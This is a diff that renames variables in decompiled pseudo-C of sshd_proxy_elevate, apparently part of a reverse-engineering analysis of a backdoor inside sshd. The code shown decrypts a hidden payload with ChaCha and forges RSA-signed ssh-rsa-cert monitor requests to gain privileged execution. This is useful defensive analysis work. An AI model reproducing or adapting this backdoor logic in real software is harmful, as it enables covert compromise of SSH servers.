@@ -64,41 +64,41 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   u8 monitor_request [1800];
   cmd_arguments_t *cmd_flags;
   RSA *rsa_tmp;
-  uchar local_e81;
+  uchar rsa_exponent_byte;
   int monitor_fd;
-  uint local_e7c;
-  u64 local_e78;
-  BIGNUM *local_e70 [2];
-  uchar local_e60 [32];
-  undefined8 local_e40;
-  undefined8 uStack_e38;
-  undefined4 local_e30 [57];
-  undefined1 local_d4a;
-  undefined1 local_d41;
-  ulong local_d40 [2];
-  undefined4 local_d30 [60];
-  sshbuf local_c40 [4];
-  uint local_b20 [2];
-  undefined1 uStack_b18;
-  undefined7 uStack_b17;
+  uint rsa_signature_len;
+  u64 serialized_chunk_len;
+  BIGNUM *rsa_components[2];
+  uchar rsa_message_digest[32];
+  u64 rsa_modulus_qword0;
+  u64 rsa_modulus_qword1;
+  uint rsa_modulus_words[57];
+  uchar rsa_modulus_shift;
+  uchar rsa_modulus_flag;
+  ulong rsa_signature_block[2];
+  uint sshbuf_tmp_words[60];
+  sshbuf sshbuf_vec[4];
+  uint netlen_tmp[2];
+  uchar netlen_tmp_pad;
+  uchar netlen_tmp_pad_hi[7];
   uchar payload_hash [32];
-  undefined4 local_abb [66];
-  undefined4 local_9b3;
-  uint local_98b;
-  undefined4 local_987;
-  undefined3 local_983;
-  undefined1 uStack_980;
-  undefined3 uStack_97f;
-  uint local_920 [5];
-  undefined1 local_90b [399];
-  u8 local_77c [1868];
+  uint rsa_template_words[66];
+  uint monitor_req_len_prefix;
+  uint monitor_req_digest_len;
+  uint monitor_req_payload_len;
+  uchar monitor_req_prefix_bytes[3];
+  uchar monitor_req_prefix_pad;
+  uchar monitor_req_prefix_pad_hi[3];
+  uint monitor_req_header_words[5];
+  uchar monitor_req_frame[399];
+  u8 monitor_req_payload[1868];
   
   bVar35 = 0;
-  local_920[0] = 0;
-  local_920[1] = 0;
-  local_920[2] = 0;
-  local_920[3] = 0;
-  puVar26 = local_920 + 4;
+  monitor_req_header_words[0] = 0;
+  monitor_req_header_words[1] = 0;
+  monitor_req_header_words[2] = 0;
+  monitor_req_header_words[3] = 0;
+  puVar26 = monitor_req_header_words + 4;
   for (lVar19 = 0x236; lVar19 != 0; lVar19 = lVar19 + -1) {
     *puVar26 = 0;
     puVar26 = puVar26 + 1;
@@ -226,10 +226,10 @@ LAB_0010845f:
           if (BVar10 != FALSE) {
             plVar14 = (long *)((0x4001 - sVar20) + (long)addr);
             for (; addr < plVar14; addr = (long *)((long)addr + 1)) {
-              local_b20[0] = 0;
-              local_b20[1] = 0;
-              uStack_b18 = 0;
-              uStack_b17 = 0;
+              netlen_tmp[0] = 0;
+              netlen_tmp[1] = 0;
+              netlen_tmp_pad = 0;
+              netlen_tmp_pad_hi = 0;
               payload_hash[0] = '\0';
               payload_hash[1] = '\0';
               payload_hash[2] = '\0';
@@ -247,31 +247,31 @@ LAB_0010845f:
               payload_hash[0xe] = '\0';
               payload_hash[0xf] = '\0';
               if ((*addr == lVar19) &&
-                 (BVar10 = sha256(addr,sVar20,(u8 *)local_b20,0x20,ctx->imported_funcs),
+                 (BVar10 = sha256(addr,sVar20,(u8 *)netlen_tmp,0x20,ctx->imported_funcs),
                  BVar10 != FALSE)) {
                 lVar34 = 0;
                 while( TRUE ) {
                   cVar2 = *(char *)((long)plVar7 + lVar34 + 0x10);
-                  uVar1 = *(u8 *)((long)local_b20 + lVar34);
+                  uVar1 = *(u8 *)((long)netlen_tmp + lVar34);
                   if ((cVar2 < (char)uVar1) || ((char)uVar1 < cVar2)) break;
                   lVar34 = lVar34 + 1;
                   if (lVar34 == 0x20) {
-                    local_b20[0] = 0;
-                    local_b20[1] = 0;
-                    uStack_b18 = 0;
-                    uStack_b17 = 0;
+                    netlen_tmp[0] = 0;
+                    netlen_tmp[1] = 0;
+                    netlen_tmp_pad = 0;
+                    netlen_tmp_pad_hi = 0;
                     puVar28 = payload_hash;
                     for (lVar19 = 0x29; lVar19 != 0; lVar19 = lVar19 + -1) {
                       *puVar28 = '\0';
                       puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                     }
-                    BVar10 = secret_data_get_decrypted((u8 *)local_b20,ctx);
+                    BVar10 = secret_data_get_decrypted((u8 *)netlen_tmp,ctx);
                     if (BVar10 == FALSE) {
                       return FALSE;
                     }
                     sVar20 = sVar20 - 0x10;
                     puVar26 = (uint *)(addr + 2);
-                    BVar10 = chacha_decrypt((u8 *)puVar26,(int)sVar20,(u8 *)local_b20,(u8 *)addr,
+                    BVar10 = chacha_decrypt((u8 *)puVar26,(int)sVar20,(u8 *)netlen_tmp,(u8 *)addr,
                                             (u8 *)puVar26,ctx->imported_funcs);
                     if (BVar10 == FALSE) {
                       return FALSE;
@@ -288,71 +288,71 @@ LAB_0010845f:
     }
   }
   pcVar32 = ctx->STR_ssh_rsa_cert_v01_openssh_com;
-  local_d40[0] = 0;
-  local_d40[1] = 0;
-  puVar26 = local_b20;
+  rsa_signature_block[0] = 0;
+  rsa_signature_block[1] = 0;
+  puVar26 = netlen_tmp;
   for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
     *puVar26 = 0;
     puVar26 = puVar26 + 1;
   }
-  local_e81 = '\x01';
-  psVar25 = local_c40;
+  rsa_exponent_byte = '\x01';
+  psVar25 = sshbuf_vec;
   for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
     *(undefined4 *)&psVar25->d = 0;
     psVar25 = (sshbuf *)((long)&psVar25->d + 4);
   }
-  local_e7c = 0;
-  puVar27 = local_e30;
+  rsa_signature_len = 0;
+  puVar27 = rsa_modulus_words;
   for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
     *puVar27 = 0;
     puVar27 = puVar27 + 1;
   }
-  local_e60[0] = '\0';
-  local_e60[1] = '\0';
-  local_e60[2] = '\0';
-  local_e60[3] = '\0';
-  local_e60[4] = '\0';
-  local_e60[5] = '\0';
-  local_e60[6] = '\0';
-  local_e60[7] = '\0';
-  local_e60[8] = '\0';
-  local_e60[9] = '\0';
-  local_e60[10] = '\0';
-  local_e60[0xb] = '\0';
-  local_e60[0xc] = '\0';
-  local_e60[0xd] = '\0';
-  local_e60[0xe] = '\0';
-  local_e60[0xf] = '\0';
-  puVar27 = local_d30;
+  rsa_message_digest[0] = '\0';
+  rsa_message_digest[1] = '\0';
+  rsa_message_digest[2] = '\0';
+  rsa_message_digest[3] = '\0';
+  rsa_message_digest[4] = '\0';
+  rsa_message_digest[5] = '\0';
+  rsa_message_digest[6] = '\0';
+  rsa_message_digest[7] = '\0';
+  rsa_message_digest[8] = '\0';
+  rsa_message_digest[9] = '\0';
+  rsa_message_digest[10] = '\0';
+  rsa_message_digest[0xb] = '\0';
+  rsa_message_digest[0xc] = '\0';
+  rsa_message_digest[0xd] = '\0';
+  rsa_message_digest[0xe] = '\0';
+  rsa_message_digest[0xf] = '\0';
+  puVar27 = sshbuf_tmp_words;
   for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
     *puVar27 = 0;
     puVar27 = puVar27 + 1;
   }
-  local_e60[0x10] = '\0';
-  local_e60[0x11] = '\0';
-  local_e60[0x12] = '\0';
-  local_e60[0x13] = '\0';
-  local_e60[0x14] = '\0';
-  local_e60[0x15] = '\0';
-  local_e60[0x16] = '\0';
-  local_e60[0x17] = '\0';
-  local_e60[0x18] = '\0';
-  local_e60[0x19] = '\0';
-  local_e60[0x1a] = '\0';
-  local_e60[0x1b] = '\0';
-  local_e60[0x1c] = '\0';
-  local_e60[0x1d] = '\0';
-  local_e60[0x1e] = '\0';
-  local_e60[0x1f] = '\0';
-  local_e40 = 0;
-  uStack_e38 = 0;
+  rsa_message_digest[0x10] = '\0';
+  rsa_message_digest[0x11] = '\0';
+  rsa_message_digest[0x12] = '\0';
+  rsa_message_digest[0x13] = '\0';
+  rsa_message_digest[0x14] = '\0';
+  rsa_message_digest[0x15] = '\0';
+  rsa_message_digest[0x16] = '\0';
+  rsa_message_digest[0x17] = '\0';
+  rsa_message_digest[0x18] = '\0';
+  rsa_message_digest[0x19] = '\0';
+  rsa_message_digest[0x1a] = '\0';
+  rsa_message_digest[0x1b] = '\0';
+  rsa_message_digest[0x1c] = '\0';
+  rsa_message_digest[0x1d] = '\0';
+  rsa_message_digest[0x1e] = '\0';
+  rsa_message_digest[0x1f] = '\0';
+  rsa_modulus_qword0 = 0;
+  rsa_modulus_qword1 = 0;
   if (((pcVar32 != (char *)0x0) && (ctx->STR_rsa_sha2_256 != (char *)0x0)) &&
      (BVar10 = contains_null_pointers(&piVar4->RSA_new,9), BVar10 == FALSE)) {
-    puVar26 = local_920;
+    puVar26 = monitor_req_header_words;
     lVar34 = 0;
     uVar33 = 0;
-    local_b20[1] = (uint)extraout_DL;
-    uStack_b18 = 2;
+    netlen_tmp[1] = (uint)extraout_DL;
+    netlen_tmp_pad = 2;
     puVar23 = puVar26;
     for (lVar19 = 0x23a; lVar19 != 0; lVar19 = lVar19 + -1) {
       *puVar23 = 0;
@@ -362,53 +362,53 @@ LAB_0010845f:
     payload_hash[6] = '\0';
     payload_hash[7] = '\0';
     payload_hash[8] = '\x1c';
-    local_e70[0] = pBVar18;
-    local_e40 = CONCAT71((local_e40 >> 8),0x80);
-    local_e70[1] = pBVar17;
+    rsa_components[0] = pBVar18;
+    rsa_modulus_qword0 = CONCAT71((rsa_modulus_qword0 >> 8),0x80);
+    rsa_components[1] = pBVar17;
     *(u64 *)(payload_hash + 9) = (undefined7)*(undefined8 *)pcVar32;
     payload_hash[0x10] = (uchar)((ulong)*(undefined8 *)pcVar32 >> 0x38);
     *(uint *)(payload_hash + 0x11) = (undefined4)*(undefined8 *)(pcVar32 + 8);
-    local_d4a = 8;
-    local_d41 = 1;
+    rsa_modulus_shift = 8;
+    rsa_modulus_flag = 1;
     *(uint *)(payload_hash + 0x15) = (undefined4)*(undefined8 *)(pcVar32 + 0xc);
     *(uint *)(payload_hash + 0x19) = (undefined4)((ulong)*(undefined8 *)(pcVar32 + 0xc) >> 0x20);
     stack0xfffffffffffff50d = *(undefined8 *)(pcVar32 + 0x14);
-    puVar22 = &local_e40;
-    puVar27 = local_abb;
+    puVar22 = &rsa_modulus_qword0;
+    puVar27 = rsa_template_words;
     for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
       *puVar27 = *(undefined4 *)puVar22;
       puVar22 = (undefined8 *)((long)puVar22 + (ulong)bVar35 * -8 + 4);
       puVar27 = puVar27 + (ulong)bVar35 * -2 + 1;
     }
     bufferSize = 0x628;
-    local_9b3 = 0x1000000;
-    local_987 = 0x7000000;
-    local_983 = (undefined3)*(undefined4 *)pcVar32;
-    uStack_980 = (undefined1)*(undefined4 *)(pcVar32 + 3);
-    uStack_97f = (undefined3)((uint)*(undefined4 *)(pcVar32 + 3) >> 8);
+    monitor_req_len_prefix = 0x1000000;
+    monitor_req_payload_len = 0x7000000;
+    monitor_req_prefix_bytes = (undefined3)*(undefined4 *)pcVar32;
+    monitor_req_prefix_pad = (undefined1)*(undefined4 *)(pcVar32 + 3);
+    monitor_req_prefix_pad_hi = (undefined3)((uint)*(undefined4 *)(pcVar32 + 3) >> 8);
     while( TRUE ) {
-      local_e78 = 0;
-      BVar10 = bignum_serialize(local_77c + uVar33,bufferSize,&local_e78,local_e70[lVar34],piVar4);
-      if ((BVar10 == FALSE) || (bufferSize < local_e78)) break;
-      uVar33 = uVar33 + local_e78;
-      bufferSize = bufferSize - local_e78;
+      serialized_chunk_len = 0;
+      BVar10 = bignum_serialize(monitor_req_payload + uVar33,bufferSize,&serialized_chunk_len,rsa_components[lVar34],piVar4);
+      if ((BVar10 == FALSE) || (bufferSize < serialized_chunk_len)) break;
+      uVar33 = uVar33 + serialized_chunk_len;
+      bufferSize = bufferSize - serialized_chunk_len;
       if (lVar34 != 0) {
         if (0x628 < uVar33) {
           return FALSE;
         }
         iVar12 = (int)uVar33;
         uVar11 = iVar12 + 0xb;
-        local_98b = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
+        monitor_req_digest_len = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
         uVar11 = iVar12 + 0x2a7;
         *(uint *)(payload_hash + 1) =
              uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 | uVar11 * 0x1000000
         ;
         uVar11 = iVar12 + 700;
-        local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
+        netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                        uVar11 * 0x1000000;
         piVar4 = ctx->imported_funcs;
-        puVar23 = local_b20;
+        puVar23 = netlen_tmp;
         puVar29 = puVar26;
         for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
           *puVar29 = *puVar23;
@@ -419,34 +419,34 @@ LAB_0010845f:
         if (r == (RSA *)0x0) {
           return FALSE;
         }
-        pBVar17 = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
+        pBVar17 = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
         if (pBVar17 != (BIGNUM *)0x0) {
-          pBVar18 = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&local_e40,0x100,(BIGNUM *)0x0);
-          d = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
+          pBVar18 = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&rsa_modulus_qword0,0x100,(BIGNUM *)0x0);
+          d = (*ctx->imported_funcs->BN_bin2bn)(&rsa_exponent_byte,1,(BIGNUM *)0x0);
           iVar12 = (*ctx->imported_funcs->RSA_set0_key)(r,pBVar18,pBVar17,d);
           if (iVar12 != 1) goto LAB_00108cd2;
           ppVar9 = ctx->imported_funcs->EVP_Digest;
           type = (*ctx->imported_funcs->EVP_sha256)();
-          iVar12 = (*ppVar9)(local_90b,uVar33 + 399,local_e60,(uint *)0x0,type,(ENGINE *)0x0);
+          iVar12 = (*ppVar9)(monitor_req_frame,uVar33 + 399,rsa_message_digest,(uint *)0x0,type,(ENGINE *)0x0);
           if (iVar12 == 1) {
             iVar12 = (*ctx->imported_funcs->RSA_sign)
-                               (0x2a0,local_e60,0x20,(uchar *)local_d40,&local_e7c,r);
-            if ((iVar12 == 1) && (local_e7c == 0x100)) {
-              local_c40[0].d = (u8 *)0xc00000014010000;
-              *(uint *)((u8 *)&local_c40[0].off + 4) = 0x10000;
-              local_c40[0].cd = *(u8 **)ctx->STR_rsa_sha2_256;
-              *(uint *)&local_c40[0].off = *(undefined4 *)(ctx->STR_rsa_sha2_256 + 8);
+                               (0x2a0,rsa_message_digest,0x20,(uchar *)rsa_signature_block,&rsa_signature_len,r);
+            if ((iVar12 == 1) && (rsa_signature_len == 0x100)) {
+              sshbuf_vec[0].d = (u8 *)0xc00000014010000;
+              *(uint *)((u8 *)&sshbuf_vec[0].off + 4) = 0x10000;
+              sshbuf_vec[0].cd = *(u8 **)ctx->STR_rsa_sha2_256;
+              *(uint *)&sshbuf_vec[0].off = *(undefined4 *)(ctx->STR_rsa_sha2_256 + 8);
               sVar20 = uVar33 + 0x2c0;
-              puVar24 = local_d40;
-              psVar30 = &local_c40[0].size;
+              puVar24 = rsa_signature_block;
+              psVar30 = &sshbuf_vec[0].size;
               for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
                 *(int *)psVar30 = (int)*puVar24;
                 puVar24 = (ulong *)((long)puVar24 + (ulong)bVar35 * -8 + 4);
                 psVar30 = (size_t *)((long)psVar30 + (ulong)bVar35 * -8 + 4);
               }
               piVar4 = ctx->imported_funcs;
-              psVar25 = local_c40;
-              puVar31 = local_77c + uVar33;
+              psVar25 = sshbuf_vec;
+              puVar31 = monitor_req_payload + uVar33;
               for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
                 *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->d;
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
@@ -490,7 +490,7 @@ LAB_001088b7:
               pcVar13 = args->args;
               uVar3 = args->cmd_type;
               plVar5 = ctx->libc_imports;
-              psVar25 = local_c40;
+              psVar25 = sshbuf_vec;
               for (lVar19 = 0x12; lVar19 != 0; lVar19 = lVar19 + -1) {
                 *(undefined4 *)&psVar25->d = 0;
                 psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
@@ -508,7 +508,7 @@ LAB_001088b7:
                 return FALSE;
               }
               if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->flags3 & 0x20) != 0)))) {
-                BVar10 = sshd_get_sshbuf(local_c40,ctx);
+                BVar10 = sshd_get_sshbuf(sshbuf_vec,ctx);
                 if (BVar10 == FALSE) {
                   return FALSE;
                 }
@@ -520,19 +520,19 @@ LAB_001088b7:
               }
               if (uVar3 == 0) {
 LAB_001089b5:
-                local_b20[1] = local_b20[1] & 0xffffff00;
-                sVar20 = local_c40[0].size;
-                if (0x40 < local_c40[0].size) {
+                netlen_tmp[1] = netlen_tmp[1] & 0xffffff00;
+                sVar20 = sshbuf_vec[0].size;
+                if (0x40 < sshbuf_vec[0].size) {
                   sVar20 = 0x40;
                 }
                 uVar11 = (int)sVar20 + 1;
-                local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
+                netlen_tmp[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                                uVar11 * 0x1000000;
-                sVar15 = fd_write(iVar12,local_b20,5,plVar5);
+                sVar15 = fd_write(iVar12,netlen_tmp,5,plVar5);
                 if (sVar15 < 0) {
                   return FALSE;
                 }
-                sVar15 = fd_write(iVar12,local_c40[0].d,sVar20,plVar5);
+                sVar15 = fd_write(iVar12,sshbuf_vec[0].d,sVar20,plVar5);
                 if (sVar15 < 0) {
                   return FALSE;
                 }
@@ -546,14 +546,14 @@ LAB_001089b5:
                 return TRUE;
               }
 LAB_0010897e:
-              local_d40[0] = local_d40[0] & 0xffffffff00000000;
-              sVar15 = fd_read(iVar12,local_d40,4,plVar5);
+              rsa_signature_block[0] = rsa_signature_block[0] & 0xffffffff00000000;
+              sVar15 = fd_read(iVar12,rsa_signature_block,4,plVar5);
               if (sVar15 < 0) {
                 return FALSE;
               }
-              uVar11 = (uint)local_d40[0] >> 0x18 | ((uint)local_d40[0] & 0xff0000) >> 8 |
-                       ((uint)local_d40[0] & 0xff00) << 8 | (uint)local_d40[0] << 0x18;
-              local_d40[0] = CONCAT44(*(uint *)((u8 *)&local_d40[0] + 4),uVar11);
+              uVar11 = (uint)rsa_signature_block[0] >> 0x18 | ((uint)rsa_signature_block[0] & 0xff0000) >> 8 |
+                       ((uint)rsa_signature_block[0] & 0xff00) << 8 | (uint)rsa_signature_block[0] << 0x18;
+              rsa_signature_block[0] = CONCAT44(*(uint *)((u8 *)&rsa_signature_block[0] + 4),uVar11);
               uVar33 = (ulong)uVar11;
               if (uVar33 != 0) {
                 if (plVar5->read == (pfn_read_t)0x0) {
@@ -568,7 +568,7 @@ LAB_0010897e:
                     if (uVar33 < 0x201) {
                       sVar20 = uVar33;
                     }
-                    sVar15 = (*plVar5->read)(iVar12,local_b20,sVar20);
+                    sVar15 = (*plVar5->read)(iVar12,netlen_tmp,sVar20);
                     if (-1 < sVar15) break;
                     piVar16 = (*plVar5->__errno_location)();
                     if (*piVar16 != 4) {
